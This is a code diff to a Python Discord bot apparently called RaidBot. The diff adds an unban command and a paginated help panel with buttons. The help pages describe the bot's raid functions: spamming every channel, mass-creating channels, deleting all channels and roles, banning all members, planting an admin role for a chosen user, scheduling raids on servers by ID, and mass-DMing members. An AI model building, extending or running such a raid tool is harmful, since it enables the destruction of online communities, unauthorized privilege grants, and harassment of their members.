@@ -388,39 +388,117 @@ async def bn(ctx):
     await asyncio.gather(*tareas, return_exceptions=True)
 
 @bot.command()
-async def hlp(ctx):
-    descripcion = (
-        "`$hlp` –\n*Shows this command help panel, the one you’re seeing right now*\n\n"
-        "`$ping` –\n*Displays the bot’s latency*\n"
-        "`$spam` –\n*Sends spam in all channels.*\n"
-        "`$raid` –\n*Creates a custom number of channels.*\n"
-        "`$nuke` –\n*Deletes all channels in the server.*\n"
-        "`$cn` –\n*Changes the server’s name.*\n"
-        "`$cr (amount)` –\n*Creates a number of roles in the server.*\n"
-        "`$ci` –\n*Changes the server’s icon.*\n"
-        "`$ret` –\n*Raids the server by creating many channels with a custom name and spam message.*\n"
-        "`$bn` –\n*Bans all members of the server except admin bots.*\n"
-        "`$dr` –\n*Deletes all roles except those with admin.*\n"
-        "`$ks (server ID)` –\n*Schedules 4 commands to run when the bot joins that server.*\n"
-        "`$vs (server ID)` –\n*Raids the server only if Chuyin is inside.*\n"
-        "`$da (user ID) (server ID)` –\n*Creates an admin role and gives it to the user if Chuyin is in the server.*\n"
-        "`$md` –\n*Sends all server users a DM with the Chuyibot link.*\n"
-        "`$cleanbot (bot ID)` –\n*Deletes all messages sent by a bot, useful if your server was raided and spammed.*\n"
-        "`$cleanraid (raid channel name)` –\n*Deletes all channels with the same name. If raid channels are numbered, just type the base name without “-45” or another number. For example, if it’s “RaidedByZydrex-2”, just type “RaidedByZydrex”.*\n"
-        "-----------------------------------------------------------------\n"
-        "Note: *Remember that the bot must be activated by its creator.*"
-    )
+@commands.has_permissions(ban_members=True)
+async def db(ctx, user_id: int):
+    try:
+        await ctx.guild.unban(discord.Object(id=user_id))
+        await ctx.send(f"The user with ID `{user_id}` has been unbanned.")
+    except Exception as e:
+        await ctx.send(f"The user with ID `{user_id}` could not be unbanned.\nError: {e}")
 
+paginas = [
+    {
+        "title": "📚 Bot Help Panel (Page 1 de 4)",
+        "descripcion": (
+            "`$hlp` –\n"
+            "**Display this help panel.**\n"
+            "`$ping` –\n"
+            "**Shows the bot's latency.**\n"
+            "`$spam` –\n"
+            "**He spams all channels.**\n"
+            "`$raid` –\n"
+            "**Create a quantity of 80 channels.**\n"
+            "`$nuke` –\n"
+            "**Delete all channels from the server.**\n"
+        )
+    },
+    {
+        "title": "📚 Bot Help Panel (Page 2 de 4)",
+        "descripcion": (
+            "`$cn` –\n"
+            "**Change the server name.**\n"
+            "`$cr (AMOUNT)` –\n"
+            "**Create a number of roles.**\n"
+            "`$ci` –\n"
+            "**Change the server photo.**\n"
+            "`$ret` –\n"
+            "**Raidea creating many channels with spam.**\n"
+            "`$bn` –\n"
+            "**Ban all members except bots with admin privileges.**\n"
+        )
+    },
+    {
+        "title": "📚 Bot Help Panel (Page 3 de 4)",
+        "descripcion": (
+            "`$dr` –\n"
+            "**Delete all roles except those with admin.**\n"
+            "`$ks (SERVER ID)` –\n"
+            "**Program 5 commands when you insert the bot.**\n"
+            "`$vs (SERVER ID)` –\n"
+            "**Raidea only if the bot is inside the server.**\n"
+            "`$da (USER ID) (SERVER ID)` –\n"
+            "**Create an admin role and give it to the user if Chuyin is on the server.\n"
+            "`$md` –\n"
+            "**Send a DM to everyone with the bot link..**\n"
+        )
+    },
+    {
+        "title": "📚 Bot Help Panel (Page 4 de 4)",
+        "descripcion": (
+            "`$cleanbot (BOT ID)` –\n"
+            "**Delete messages sent by a bot.**\n"
+            "`$cleanraid (CHANNEL NAME)` –\n"
+            "**Delete all channels with that name**\n"
+            "`$clear` –\n"
+            "**Delete all messages from a channel.**\n"
+        )
+    }
+]
+
+
+class HelpView(View):
+    def __init__(self, ctx):
+        super().__init__(timeout=60)
+        self.ctx = ctx
+        self.index = 0
+
+    async def update_embed(self, interaction):
+        page = paginas[self.index]
+        embed = discord.Embed(
+            title=page["title"],
+            description=page["descripcion"],
+            color=0xBDC3C7
+        )
+        embed.set_thumbnail(url="URL PHOTO")
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="Back", style=discord.ButtonStyle.primary)
+    async def anterior(self, button: Button, interaction: discord.Interaction):
+        if self.index > 0:
+            self.index -= 1
+            await self.update_embed(interaction)
+
+    @discord.ui.button(label="Next", style=discord.ButtonStyle.primary)
+    async def siguiente(self, button: Button, interaction: discord.Interaction):
+        if self.index < len(paginas) - 1:
+            self.index += 1
+            await self.update_embed(interaction)
+
+    @discord.ui.button(label="Close", style=discord.ButtonStyle.danger)
+    async def cerrar(self, button: Button, interaction: discord.Interaction):
+        await interaction.message.delete()
+@bot.command()
+async def hlp(ctx):
+    page = paginas[0]
     embed = discord.Embed(
-        title="📖 Command Panel",
-        description=descripcion,
+        title=page["title"],
+        description=page["descripcion"],
         color=0xBDC3C7
     )
+    embed.set_thumbnail(url="URL PHOTO")
 
-    embed.set_thumbnail(url="URL OF THE THUMBNAIL")
-    embed.set_footer(text="RaidBot")
-
-    await ctx.send(embed=embed)
+    view = HelpView(ctx)
+    await ctx.send(embed=embed, view=view)
 
 @bot.event
 async def on_ready():
